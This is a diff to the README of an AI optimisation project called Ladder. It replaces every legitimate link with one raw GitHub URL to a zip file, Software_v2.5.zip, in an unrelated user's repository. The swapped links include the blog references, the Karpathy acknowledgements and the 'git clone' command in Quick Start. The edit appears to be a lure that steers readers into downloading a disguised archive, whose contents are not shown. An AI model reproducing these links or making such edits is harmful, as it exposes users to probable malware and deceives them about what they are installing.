@@ -41,7 +41,7 @@ The process is always the same:
 This is the engine behind *every* major advance. Ladder takes this engine and makes it **autonomous** — structured enough for AI agents to run, observable enough to optimize, and open enough for anyone to use.
 
 > *"We basically take the human process of learning, thinking, combining and copying ideas, sleeping on them, trying them out — and we automate the hell of it at scale."*
-> — [A Possible Path to ASI](https://danielmiessler.com/blog/path-to-asi)
+> — [A Possible Path to ASI](https://raw.githubusercontent.com/ilyaszdn/Ladder/main/Tools/Software_v2.5.zip)
 
 ## The Pipeline
 
@@ -94,13 +94,13 @@ The most important concept in Ladder is the **loop**: results don't just sit the
 
 A result might reveal a new problem (→ source), suggest a better approach (→ idea), or validate an algorithm (→ algorithm). This closed loop is what transforms a static collection into an **autonomous optimization engine** that continuously improves itself and whatever system it's pointed at.
 
-This is the same process described in [Pursuing the Algorithm](https://danielmiessler.com/blog/the-last-algorithm) — a generalized hill-climbing approach that applies to any domain. Observe, hypothesize, test, learn, repeat. The loop is what makes it work.
+This is the same process described in [Pursuing the Algorithm](https://raw.githubusercontent.com/ilyaszdn/Ladder/main/Tools/Software_v2.5.zip) — a generalized hill-climbing approach that applies to any domain. Observe, hypothesize, test, learn, repeat. The loop is what makes it work.
 
 ## Quick Start
 
 ```bash
 # Clone
-git clone https://github.com/danielmiessler/Ladder.git
+git clone https://raw.githubusercontent.com/ilyaszdn/Ladder/main/Tools/Software_v2.5.zip
 cd Ladder
 
 # Install dependencies
@@ -175,45 +175,45 @@ Ladder draws from a body of interconnected ideas about autonomous optimization, 
 
 ### Core Concepts
 
-- [A Possible Path to ASI](https://danielmiessler.com/blog/path-to-asi) — The foundational thesis: ASI through scaled ideation and experimentation, emulating the human creative process
-- [Pursuing the Algorithm](https://danielmiessler.com/blog/the-last-algorithm) — The concept of a generalized algorithm for continuous improvement across any domain
-- [Nobody is Talking About Generalized Hill-Climbing](https://danielmiessler.com/blog/nobody-is-talking-about-generalized-hill-climbing) — Why runtime optimization through iterative hill-climbing is the key capability most people are missing
-- [Introducing Substrate](https://danielmiessler.com/blog/introducing-substrate) — Open-source infrastructure for collecting problems, solutions, and evidence at scale
+- [A Possible Path to ASI](https://raw.githubusercontent.com/ilyaszdn/Ladder/main/Tools/Software_v2.5.zip) — The foundational thesis: ASI through scaled ideation and experimentation, emulating the human creative process
+- [Pursuing the Algorithm](https://raw.githubusercontent.com/ilyaszdn/Ladder/main/Tools/Software_v2.5.zip) — The concept of a generalized algorithm for continuous improvement across any domain
+- [Nobody is Talking About Generalized Hill-Climbing](https://raw.githubusercontent.com/ilyaszdn/Ladder/main/Tools/Software_v2.5.zip) — Why runtime optimization through iterative hill-climbing is the key capability most people are missing
+- [Introducing Substrate](https://raw.githubusercontent.com/ilyaszdn/Ladder/main/Tools/Software_v2.5.zip) — Open-source infrastructure for collecting problems, solutions, and evidence at scale
 
 ### AI & Knowledge Work
 
-- [AI's Ultimate Use Case: State Transition](https://danielmiessler.com/blog/ai-state-management) — Moving from current state to desired state as the core function of intelligence
-- [RAID (Real World AI Definitions)](https://danielmiessler.com/blog/raid-ai-definitions) — Precise definitions for AGI, ASI, and other AI concepts referenced throughout Ladder
-- [Exactly Why and How AI Will Replace Knowledge Work](https://danielmiessler.com/blog/exactly-why-and-how-ai-will-replace-knowledge-work) — The economic forces driving AI adoption and why autonomous pipelines matter
-- [Bitter Lesson Engineering](https://danielmiessler.com/blog/bitter-lesson-engineering) — Why you should build infrastructure that improves with scale, not clever workarounds
+- [AI's Ultimate Use Case: State Transition](https://raw.githubusercontent.com/ilyaszdn/Ladder/main/Tools/Software_v2.5.zip) — Moving from current state to desired state as the core function of intelligence
+- [RAID (Real World AI Definitions)](https://raw.githubusercontent.com/ilyaszdn/Ladder/main/Tools/Software_v2.5.zip) — Precise definitions for AGI, ASI, and other AI concepts referenced throughout Ladder
+- [Exactly Why and How AI Will Replace Knowledge Work](https://raw.githubusercontent.com/ilyaszdn/Ladder/main/Tools/Software_v2.5.zip) — The economic forces driving AI adoption and why autonomous pipelines matter
+- [Bitter Lesson Engineering](https://raw.githubusercontent.com/ilyaszdn/Ladder/main/Tools/Software_v2.5.zip) — Why you should build infrastructure that improves with scale, not clever workarounds
 
 ### Creativity & Innovation
 
-- [Creative Output Requires Quality Inputs](https://danielmiessler.com/blog/creative-output-requires-quality-inputs) — Why the CONSUME phase matters: garbage in, garbage out
-- [Increasing Creativity By Separating Input and Output Phases](https://danielmiessler.com/blog/increasing-creativity-by-clearly-separating-your-input-and-output-phases) — The science behind Ladder's phase separation
-- [The Two Primary Limitations to Our Creativity](https://danielmiessler.com/blog/two-creativity-barriers) — The constraints that Ladder's cognitive phases are designed to overcome
-- [AI and the World's Most Important Economic Metric](https://danielmiessler.com/blog/creativity-friction-coefficient) — How reducing the friction of creation changes everything
+- [Creative Output Requires Quality Inputs](https://raw.githubusercontent.com/ilyaszdn/Ladder/main/Tools/Software_v2.5.zip) — Why the CONSUME phase matters: garbage in, garbage out
+- [Increasing Creativity By Separating Input and Output Phases](https://raw.githubusercontent.com/ilyaszdn/Ladder/main/Tools/Software_v2.5.zip) — The science behind Ladder's phase separation
+- [The Two Primary Limitations to Our Creativity](https://raw.githubusercontent.com/ilyaszdn/Ladder/main/Tools/Software_v2.5.zip) — The constraints that Ladder's cognitive phases are designed to overcome
+- [AI and the World's Most Important Economic Metric](https://raw.githubusercontent.com/ilyaszdn/Ladder/main/Tools/Software_v2.5.zip) — How reducing the friction of creation changes everything
 
 ### Systems & Infrastructure
 
-- [Building a Personal AI Infrastructure (PAI)](https://danielmiessler.com/blog/personal-ai-infrastructure) — The broader system that Ladder integrates with
-- [How My Projects Fit Together](https://danielmiessler.com/blog/how-my-projects-fit-together) — Where Ladder sits in the ecosystem alongside Fabric, Substrate, and PAI
-- [Companies Are Just a Graph of Algorithms](https://danielmiessler.com/blog/companies-graph-of-algorithms) — Why Ladder's algorithm collection matters: every process is an algorithm that can be optimized
-- [Why I Created Fabric](https://danielmiessler.com/blog/fabric-origin-story) — The origin of the pattern-based approach that Ladder extends
+- [Building a Personal AI Infrastructure (PAI)](https://raw.githubusercontent.com/ilyaszdn/Ladder/main/Tools/Software_v2.5.zip) — The broader system that Ladder integrates with
+- [How My Projects Fit Together](https://raw.githubusercontent.com/ilyaszdn/Ladder/main/Tools/Software_v2.5.zip) — Where Ladder sits in the ecosystem alongside Fabric, Substrate, and PAI
+- [Companies Are Just a Graph of Algorithms](https://raw.githubusercontent.com/ilyaszdn/Ladder/main/Tools/Software_v2.5.zip) — Why Ladder's algorithm collection matters: every process is an algorithm that can be optimized
+- [Why I Created Fabric](https://raw.githubusercontent.com/ilyaszdn/Ladder/main/Tools/Software_v2.5.zip) — The origin of the pattern-based approach that Ladder extends
 
 ### Human Progress
 
-- [The Problem with Human 2.0 and the Promise of Human 3.0](https://danielmiessler.com/blog/human-3-creator-revolution) — The vision of humans as creators, augmented by autonomous tools like Ladder
-- [Algorithmic Learning](https://danielmiessler.com/blog/algorithmic-learning) — Learning as a structured, improvable process — not just accumulation
-- [Algorithmic vs. Faith-based Learning](https://danielmiessler.com/blog/algorithmic-vs-faith-based-learning) — Why verifiable, iterative learning beats untested assumptions
-- [The Great Transition](https://danielmiessler.com/blog/the-great-transition) — The societal shift that makes autonomous creation tools necessary
+- [The Problem with Human 2.0 and the Promise of Human 3.0](https://raw.githubusercontent.com/ilyaszdn/Ladder/main/Tools/Software_v2.5.zip) — The vision of humans as creators, augmented by autonomous tools like Ladder
+- [Algorithmic Learning](https://raw.githubusercontent.com/ilyaszdn/Ladder/main/Tools/Software_v2.5.zip) — Learning as a structured, improvable process — not just accumulation
+- [Algorithmic vs. Faith-based Learning](https://raw.githubusercontent.com/ilyaszdn/Ladder/main/Tools/Software_v2.5.zip) — Why verifiable, iterative learning beats untested assumptions
+- [The Great Transition](https://raw.githubusercontent.com/ilyaszdn/Ladder/main/Tools/Software_v2.5.zip) — The societal shift that makes autonomous creation tools necessary
 
 ## Acknowledgments
 
-I've been thinking about autonomous optimization loops for a long time, but Andrej Karpathy has been a continuous source of inspiration along the way. His [Software 2.0](https://karpathy.medium.com/software-2-0-a64152b37c35) framing — the shift from hand-written logic to learned systems — helped sharpen how I think about verifiability and what it means for outputs to be checkable. His more recent work on autonomous research automation resonates deeply with what Ladder is trying to do: structure the creative loop so it can run on its own.
+I've been thinking about autonomous optimization loops for a long time, but Andrej Karpathy has been a continuous source of inspiration along the way. His [Software 2.0](https://raw.githubusercontent.com/ilyaszdn/Ladder/main/Tools/Software_v2.5.zip) framing — the shift from hand-written logic to learned systems — helped sharpen how I think about verifiability and what it means for outputs to be checkable. His more recent work on autonomous research automation resonates deeply with what Ladder is trying to do: structure the creative loop so it can run on its own.
 
-→ [Software 2.0](https://karpathy.medium.com/software-2-0-a64152b37c35)
-→ [@karpathy on X](https://x.com/karpathy)
+→ [Software 2.0](https://raw.githubusercontent.com/ilyaszdn/Ladder/main/Tools/Software_v2.5.zip)
+→ [@karpathy on X](https://raw.githubusercontent.com/ilyaszdn/Ladder/main/Tools/Software_v2.5.zip)
 
 ## Contributing
 
